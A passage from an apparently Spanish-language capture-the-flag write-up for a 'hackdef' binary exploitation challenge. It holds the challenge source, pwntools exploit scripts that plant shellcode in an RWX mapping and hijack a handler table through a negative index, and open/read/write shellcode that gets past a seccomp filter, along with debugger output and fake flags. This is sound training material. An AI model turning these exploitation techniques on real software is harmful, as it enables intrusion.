+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 3411
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{4_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 3411)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag5">
+<br><h3 class="post-title">Flag 5</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#define </span><span class="na">TAM_SHELLCODE</span><span class="mi"> 0x1000
+
+</span><span class="no">void</span><span class="na"> info_reporte</span><span class="p">() {
+    std::cout</span><span class="o"> <<</span><span class="s"> "Levantando reporte..."</span><span class="o"> <<</span><span class="p"> std::endl;
+    std::cout</span><span class="o"> <<</span><span class="s"> "Tam de reporte: "</span><span class="o"> <<</span><span class="p"> std::endl;
+    </span><span class="no">unsigned int</span><span class="p"> n;
+    std::cin</span><span class="o"> >></span><span class="p"> n;
+
+    </span><span class="o">if</span><span class="p"> (n</span><span class="o"> ></span><span class="p"> TAM_SHELLCODE) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Reporte muy grande"</span><span class="o"> <<</span><span class="p"> std::endl;
+        salir();
+    }
+
+    </span><span class="no">void</span><span class="o"> *</span><span class="p">mem</span><span class="o"> =</span><span class="p"> mmap(</span><span class="mi">nullptr</span><span class="p">, n</span><span class="o"> +</span><span class="mi"> 0x10</span><span class="p">, PROT_READ </span><span class="o">|</span><span class="p"> PROT_WRITE </span><span class="o">| </span><span class="p">PROT_EXEC, MAP_PRIVATE</span><span class="o"> |</span><span class="p"> MAP_ANONYMOUS, </span><span class="o">-</span><span class="mi">1</span><span class="p">, </span><span class="mi">0</span><span class="p">);
+
+    </span><span class="o">if</span><span class="p"> (mem</span><span class="o"> ==</span><span class="p"> MAP_FAILED) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Error al levantar reporte. Contacta admin"</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="o">return</span><span class="p">;
+    }
+
+    std::cout </span><span class="o"><< </span><span class="s">"Ingresa detalles:"</span><span class="p">;
+    lee_basura_endl();
+    </span><span class="no">fread</span><span class="p">(mem,</span><span class="mi"> 1</span><span class="p">, n, stdin);
+
+    std::cout</span><span class="o"> <<</span><span class="s"> "Reporte enviado. Numero de seguimiento: "</span><span class="o"> <<</span><span class="p"> (</span><span class="na">uint64_t</span><span class="p">) (mem) </span><span class="o"><< </span><span class="p">std::endl;
+    imprimir_flag(</span><span class="s">"/flag_04.txt"</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    int3
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3</span><span class="p"> exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process '/usr/bin/gdbserver': pid 4433
+[</span><span class="az">*</span><span class="p">] running in new terminal: ['/usr/bin/gdb', '-q', './chal']
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+OK
+Reporte enviado. Numero de seguimiento: 124251023167488
+hackdef{4_f4k3_fl4g_4_t35t1ng}
+Servicio interno de tarjetas de credito
+** Menu:
+1. Registrar tarjeta
+2. Registrar NIP
+3. Consultar NIP
+4. Borrar NIP
+5. Salir
+> </span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/8i 124251023167488
+   </span><span class="az">0x710172195000</span><span class="p">:</span><span class="ve">      int3
+   </span><span class="az">0x710172195001</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x710172195002</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x710172195003</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x710172195004</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x710172195005</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x710172195006</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x710172195007</span><span class="p">:</span><span class="ve">      nop
+</span><span class="ro">pwndbg></span><span class="p"> vmmap 124251023167488
+LEGEND: </span><span class="am">STACK</span><span class="p"> |</span><span class="az"> HEAP</span><span class="p"> | </span><span class="ro">CODE</span><span class="p"> |</span><span class="sa"> DATA</span><span class="p"> |</span><span class="ro"> WX</span><span class="p"> |</span><span class="p"> RODATA
+             Start                End Perm     Size  Offset File (set vmmap-prefer-relpaths on)
+</span><span class="sa">    0x710172182000     0x710172183000 rw-p     1000   34000 /usr/lib/x86_64-linux-gnu/libhackdef.so
+</span><span class="ro">►   0x710172195000     0x710172196000 rwxp     1000       0 [anon_710172195] +0x0
+</span><span class="sa">    0x710172196000     0x710172198000 rw-p     2000       0 [anon_710172196]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, asm, p64
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./chal"</span><span class="p">,</span><span class="s"> "continue"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> asm(</span><span class="s">"""
+    int3
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+    nop
+"""</span><span class="p">, </span><span class="ra">arch</span><span class="o"></span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
+
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/10gx &handlers
+</span><span class="az">0x573d8835a400</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">>:      0x00006ffc0d281000      0x00006ffc0d281000
+</span><span class="az">0x573d8835a410</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">+16>:   0x00006ffc0d281000      0x00006ffc0d281000
+</span><span class="az">0x573d8835a420</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">+32>:   0x00006ffc0d281000      0x00006ffc0d281000
+</span><span class="az">0x573d8835a430</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">+48>:   0x00006ffc0d281000      0x00006ffc0d281000
+</span><span class="az">0x573d8835a440</span><span class="p"> &lt</span><span class="am">handlers</span><span class="p">+64>:   0x00006ffc0d281000      0x00006ffc0d281000
+</span><span class="ro">pwndbg></span><span class="p"> x/8i 0x00006ffc0d281000
+   </span><span class="az">0x6ffc0d281000</span><span class="p">:</span><span class="ve">      int3
+   </span><span class="az">0x6ffc0d281001</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281002</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281003</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281004</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281005</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281006</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281007</span><span class="p">:</span><span class="ve">      nop
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> c
+Continuing.
+</span><span class="az">0x00006ffc0d281001</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/8i $rip-1
+   </span><span class="az">0x6ffc0d281000</span><span class="p">:</span><span class="ve">      int3
+</span><span class="p">=> </span><span class="az">0x6ffc0d281001</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281002</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281003</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281004</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281005</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281006</span><span class="p">:</span><span class="ve">      nop
+   </span><span class="az">0x6ffc0d281007</span><span class="p">:</span><span class="ve">      nop
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> init_seccomp</span><span class="p">() {
+    scmp_filter_ctx ctx</span><span class="o"> =</span><span class="p"> seccomp_init(SCMP_ACT_ALLOW);
+
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="p">ctx) {
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"seccomp_init"</span><span class="p">);
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+    }
+
+    </span><span class="o">if</span><span class="p"> (seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),</span><span class="mi"> 0</span><span class="p">)</span><span class="o"> <</span><span class="mi"> 0</span><span class="p">) {
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"seccomp_rule_add(execve)"</span><span class="p">);
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+    }
+
+    </span><span class="o">if</span><span class="p"> (seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), </span><span class="mi">0</span><span class="p">)</span><span class="o"> <</span><span class="mi"> 0</span><span class="p">) {
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"seccomp_rule_add(execveat)"</span><span class="p">);
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+    }
+
+    </span><span class="o">if</span><span class="p"> (seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(fork),</span><span class="mi"> 0</span><span class="p">)</span><span class="o"> <</span><span class="mi"> 0</span><span class="p">) {
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"seccomp_rule_add(fork)"</span><span class="p">);
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+    }
+
+    </span><span class="o">if</span><span class="p"> (seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(vfork),</span><span class="mi"> 0</span><span class="p">)</span><span class="o"> <</span><span class="mi"> 0</span><span class="p">) {
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"seccomp_rule_add(vfork)"</span><span class="p">);
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+    }
+
+    </span><span class="o">if</span><span class="p"> (seccomp_load(ctx)</span><span class="o"> <</span><span class="mi"> 0</span><span class="p">) {
+        </span><span class="no">perror</span><span class="p">(</span><span class="s">"seccomp_load"</span><span class="p">);
+        seccomp_release(ctx);
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);
+    }
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="o">#include</span><span class="s"> &ltunistd.h>
+</span><span class="o">#include</span><span class="s"> &ltfcntl.h>
+
+</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
+    </span><span class="no">char</span><span class="p"> buffer[</span><span class="mi">64</span><span class="p">];
+
+    </span><span class="no">int</span><span class="p"> fd</span><span class="o"> =</span><span class="p"> open(</span><span class="s">"/flag_05.txt"</span><span class="p">,</span><span class="mi"> 0</span><span class="p">);
+
+    read(fd, buffer,</span><span class="mi"> 64</span><span class="p">);
+    write(</span><span class="mi">1</span><span class="p">, buffer,</span><span class="mi"> 64</span><span class="p">);
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">shellcode </span><span class="o">= </span><span class="p">asm(</span><span class="s">"""
+    int3                        # breakpoint
+
+    push 0x7478742e             # $rsp = &".txt"
+    mov rax, 0x35305f67616c662f # $rax = "/flag_05"
+    push rax                    # $rsp = &"/flag_05.txt"
+    mov rdi, rsp                # $rdi = &"/flag_05.txt"
+    cdq                         # $rdx = 0x0
+    mov rsi, rdx                # $rsi = 0x0
+    push 0x2                    # open()
+    pop rax                     # $rax = open()
+    syscall                     # syscall
+
+    mov rdi, rax                # $rdi = fd
+    mov rsi, rsp                # $rdi = $rsp
+    push 0x40                   # 64 bytes
+    pop rdx                     # $rdx = 64
+    xor rax, rax                # $rax = read()
+    syscall                     # syscall
+
+    push 0x1                    # stoud
+    pop rdi                     # $rdi = stdout
+    mov rax, rdi                # $rax = write()
+    syscall                     # syscall
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="az">0x00007d813ddf8001 </span><span class="p">in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/20i $rip
+=> </span><span class="az">0x7d813ddf8001</span><span class="p">:</span><span class="ve">      push</span><span class="az">   0x7478742e
+   0x7d813ddf8006</span><span class="p">:</span><span class="ve">      movabs</span><span class="ro"> rax</span><span class="p">,</span><span class="az">0x35305f67616c662f
+   0x7d813ddf8010</span><span class="p">:</span><span class="ve">      push</span><span class="ro">   rax
+   </span><span class="az">0x7d813ddf8011</span><span class="p">:</span><span class="ve">      mov</span><span class="ro">    rdi</span><span class="p">,</span><span class="ro">rsp
+   </span><span class="az">0x7d813ddf8014</span><span class="p">:</span><span class="ve">      cdq
+   </span><span class="az">0x7d813ddf8015</span><span class="p">:</span><span class="ve">      push</span><span class="ro">   rdx
+   </span><span class="az">0x7d813ddf8016</span><span class="p">:</span><span class="ve">      pop</span><span class="ro">    rsi
+   </span><span class="az">0x7d813ddf8017</span><span class="p">:</span><span class="ve">      push</span><span class="az">   0x2
+   0x7d813ddf8019</span><span class="p">:</span><span class="ve">      pop</span><span class="ro">    rax
+   </span><span class="az">0x7d813ddf801a</span><span class="p">:</span><span class="ve">      syscall
+   </span><span class="az">0x7d813ddf801c</span><span class="p">:</span><span class="ve">      mov</span><span class="ro">    rdi</span><span class="p">,</span><span class="ro">rax
+   </span><span class="az">0x7d813ddf801f</span><span class="p">:</span><span class="ve">      mov</span><span class="ro">    rsi</span><span class="p">,</span><span class="ro">rsp
+   </span><span class="az">0x7d813ddf8022</span><span class="p">:</span><span class="ve">      push</span><span class="az">   0x40
+   0x7d813ddf8024</span><span class="p">:</span><span class="ve">      pop</span><span class="ro">    rdx
+   </span><span class="az">0x7d813ddf8025</span><span class="p">:</span><span class="ve">      xor</span><span class="ro">    rax</span><span class="p">,</span><span class="ro">rax
+   </span><span class="az">0x7d813ddf8028</span><span class="p">:</span><span class="ve">      syscall
+   </span><span class="az">0x7d813ddf802a</span><span class="p">:</span><span class="ve">      push</span><span class="az">   0x1
+   0x7d813ddf802c</span><span class="p">:</span><span class="ve">      pop</span><span class="ro">    rdi
+   </span><span class="az">0x7d813ddf802d</span><span class="p">:</span><span class="ve">      mov</span><span class="ro">    rax</span><span class="p">,</span><span class="ro">rdi
+   </span><span class="az">0x7d813ddf8030</span><span class="p">:</span><span class="ve">      syscall
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, asm, p64, log
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./chal"</span><span class="p">)
+
+shellcode </span><span class="o">= </span><span class="p">asm(</span><span class="s">"""
+    push 0x7478742e             # $rsp = &".txt"
+    mov rax, 0x35305f67616c662f # $rax = "/flag_05"
+    push rax                    # $rsp = &"/flag_05.txt"
+    mov rdi, rsp                # $rdi = &"/flag_05.txt"
+    cdq                         # $rdx = 0x0
+    mov rsi, rdx                # $rsi = 0x0
+    push 0x2                    # open()
+    pop rax                     # $rax = open()
+    syscall                     # syscall
+
+    mov rdi, rax                # $rdi = fd
+    mov rsi, rsp                # $rdi = $rsp
+    push 0x40                   # 64 bytes
+    pop rdx                     # $rdx = 64
+    xor rax, rax                # $rax = read()
+    syscall                     # syscall
+
+    push 0x1                    # stoud
+    pop rdi                     # $rdi = stdout
+    mov rax, rdi                # $rax = write()
+    syscall                     # syscall
+"""</span><span class="p">,</span><span class="ra"> arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="no"> b</span><span class="s">"21222"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": </span><span class="mi">\n</span><span class="s">"</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(shellcode)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">":"</span><span class="p">, shellcode)
+shell.recvuntil(</span><span class="no">b</span><span class="s">": "</span><span class="p">)
+
+rwx</span><span class="o"> =</span><span class="no"> int</span><span class="p">(shell.recvline().strip())
+payload </span><span class="o">= </span><span class="p">p64(rwx)</span><span class="o"> *</span><span class="mi"> 512</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">,</span><span class="s"> b"2"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, </span><span class="no">b</span><span class="s">"-2196"</span><span class="p">)
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">,</span><span class="na"> str</span><span class="p">(</span><span class="no">len</span><span class="p">(payload)).encode())
+shell.sendlineafter(</span><span class="no">b</span><span class="s">": "</span><span class="p">, payload)
+
+shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+flag</span><span class="o"> =</span><span class="p"> shell.recvline_contains(</span><span class="no">b</span><span class="s">"hackdef"</span><span class="p">)
+log.info(</span><span class="no">f</span><span class="s">"Flag:</span><span class="p"> {flag.decode()}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 5383
+[</span><span class="az">*</span><span class="p">] Flag: hackdef{5_f4k3_fl4g_4_t35t1ng}
+[</span><span class="az">*</span><span class="p">] Stopped process './chal' (pid 5383)</span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="flag6">
+<br><h3 class="post-title">Flag 6</h3><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> init_flagprocess</span><span class="p">() {
+    </span><span class="no">int</span><span class="p"> p2c[</span><span class="mi">2</span><span class="p">];
+    </span><span class="no">int</span><span class="p"> c2p[</span><span class="mi">2</span><span class="p">];
+
+    </span><span class="o">if</span><span class="p"> (pipe(p2c)</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) die(</span><span class="s">"pipe p2c"</span><span class="p">);
+    </span><span class="o">if</span><span class="p"> (pipe(c2p)</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) die(</span><span class="s">"pipe c2p"</span><span class="p">);
+
+    </span><span class="na">pid_t </span><span class="p">pid</span><span class="o"> =</span><span class="p"> fork();
+    </span><span class="o">if </span><span class="p">(pid</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) {
+        die(</span><span class="s">"fork"</span><span class="p">);
+    }
+
+    </span><span class="o">if</span><span class="p"> (pid </span><span class="o">== </span><span class="mi">0</span><span class="p">) {
+        close(p2c[</span><span class="mi">1</span><span class="p">]);
+        close(c2p[</span><span class="mi">0</span><span class="p">]);
+
+        </span><span class="o">if</span><span class="p"> (dup2(p2c[</span><span class="mi">0</span><span class="p">], STDIN_FILENO)</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) die(</span><span class="s">"dup2 stdin"</span><span class="p">);
+        </span><span class="o">if</span><span class="p"> (dup2(c2p[</span><span class="mi">1</span><span class="p">], STDOUT_FILENO)</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) die(</span><span class="s">"dup2 stdout"</span><span class="p">);
+        </span><span class="o">if</span><span class="p"> (dup2(c2p[</span><span class="mi">1</span><span class="p">], STDERR_FILENO)</span><span class="o"> == -</span><span class="mi">1</span><span class="p">) die(</span><span class="s">"dup2 stderr"</span><span class="p">);
+
+        close(p2c[</span><span class="mi">0</span><span class="p">]);
+        close(c2p[</span><span class="mi">1</span><span class="p">]);
+
+        </span><span class="o">const</span><span class="no"> char</span><span class="o"> *</span><span class="p">argv[] </span><span class="o">=</span><span class="p"> {</span><span class="s">"print_flag"</span><span class="p">,</span><span class="mi"> nullptr</span><span class="p">};
+        execvp(</span><span class="s">"/print_flag"</span><span class="p">,</span><span class="o"> const_cast</span><span class="p">&lt</span><span class="no">char</span><span class="o"> *const *</span><span class="p">>(argv));
+
+        die(</span><span class="s">"execvp"</span><span class="p">);
+    }</span><span class="o"> else</span><span class="p"> {
+        close(p2c[</span><span class="mi">0</span><span class="p">]);
+        close(c2p[</span><span class="mi">1</span><span class="p">]);
+    }
+}</span>
+</code></pre></div></div><br>
+
+<a href="/challenges/creditcards/1.png" target="_blank"><div><p><img src="/challenges/creditcards/1.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ gdb </span><span class="p">-q chal
+Reading symbols from </span><span class="ve">chal</span><span class="p">...
+(No debugging symbols found in </span><span class="ve">chal</span><span class="p">)
+</span><span class="ro">pwndbg></span><span class="p"> b *init_flagprocess+0x14e
+Breakpoint 1 at</span><span class="az"> 0x3fe88
+</span><span class="ro">pwndbg></span><span class="p"> r
+Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
+
+Breakpoint 1,</span><span class="az"> 0x0000555555593e88</span><span class="p"> in</span><span class="am"> init_flagprocess</span><span class="p">() ()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $rip
+=> </span><span class="az">0x555555593e88</span><span class="p"> &lt</span><span class="am">_Z16init_flagprocessv</span><span class="p">+334>:</span><span class="ve">  mov</span><span class="ro">    eax</span><span class="p">,DWORD PTR [</span><span class="ro">rbp</span><span class="p">-</span><span class="az">0x30</span><span class="p">]
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/wx $rbp-0x2c
+</span><span class="az">0x7fffffffdd04</span><span class="p">: 0x00000004
+</span><span class="ro">pwndbg></span><span class="p"> x/wx $rbp-0x28
+</span><span class="az">0x7fffffffdd08</span><span class="p">: 0x00000005
+</span><span class="ro">pwndbg></span><span class="p"> x/wx $rbp-0x24
+</span><span class="az">0x7fffffffdd0c</span><span class="p">: 0x00000006
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">int</span><span class="na"> main</span><span class="p">(</span><span class="no">int</span><span class="ra"> argc</span><span class="p">,</span><span class="no"> char</span><span class="o"> *</span><span class="ra">argv</span><span class="p">[]) {
+    init_buffers();
+    imprimir_flag06();
+
+    std::string token</span><span class="o"> =</span><span class="s"> "0"</span><span class="p">;
+    std::cin</span><span class="o"> >></span><span class="p"> token;
+    </span><span class="o">for</span><span class="p"> (</span><span class="no">const</span><span class="no"> char</span><span class="o"> &</span><span class="p">c</span><span class="o">:</span><span class="p"> token) {
+        </span><span class="o">if</span><span class="p"> (c</span><span class="o"> <</span><span class="s"> 'a'</span><span class="p">) printError();
+        </span><span class="o">if</span><span class="p"> (c</span><span class="o"> ></span><span class="s"> 'z'</span><span class="p">) printError();
+    }
+
+    std::string ruta_flag</span><span class="o"> =</span><span class="s"> "/root/flag_"</span><span class="o"> +</span><span class="p"> token</span><span class="o"> +</span><span class="s"> ".txt"</span><span class="p">;
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="p">std::filesystem::exists(ruta_flag)) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Token incorrecto. Contacta un admin"</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+    }
+
+    std::ifstream archivo(ruta_flag);
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="p">archivo.is_open()) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Error al abrir. Contacta un admin"</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+    }
+
+    UUID nonce</span><span class="o"> =</span><span class="p"> get_random_uuid();
+    print_hex(nonce.bytes,</span><span class="mi"> 0x10</span><span class="p">);
+
+    SHA256_DIGEST digest</span><span class="o"> =</span><span class="p"> sha256_powN(nonce.bytes,</span><span class="mi"> 0x10</span><span class="p">, ITERACIONES);
+    std::string ans_hex;
+    std::cin</span><span class="o"> >></span><span class="p"> ans_hex;
+
+    </span><span class="o">if</span><span class="p"> (ans_hex</span><span class="o"> !=</span><span class="p"> digest.ToHex()) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "NO. Respuesta incorrecta"</span><span class="o"> <<</span><span class="p"> std::endl;
+        std::cout</span><span class="o"> <<</span><span class="s"> "La correcta era: "</span><span class="o"> <<</span><span class="p"> digest.ToHex()</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+    }
+
+    std::string flag;
+    archivo</span><span class="o"> >></span><span class="p"> flag;
+
+    archivo.close();
+
+    std::cout</span><span class="o"> <<</span><span class="p"> flag</span><span class="o"> <<</span><span class="p"> std::endl;
+    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">void</span><span class="na"> imprimir_flag06</span><span class="p">() {
+    std::ifstream archivo(</span><span class="s">"/root/flag_06.txt"</span><span class="p">);
+    </span><span class="o">if</span><span class="p"> (</span><span class="o">!</span><span class="p">archivo.is_open()) {
+        std::cout</span><span class="o"> <<</span><span class="s"> "Error al abrir flag06. Contacta un admin"</span><span class="o"> <<</span><span class="p"> std::endl;
+        </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);
+    }
+
+    std::string flag;
+    archivo</span><span class="o"> >></span><span class="p"> flag;
+    archivo.close();
+
+    std::cout</span><span class="o"> <<</span><span class="p"> flag</span><span class="o"> <<</span><span class="p"> std::endl;
+}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ /print_flag</span><span class="p">
+hackdef{6_f4k3_fl4g_4_t35t1ng}</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
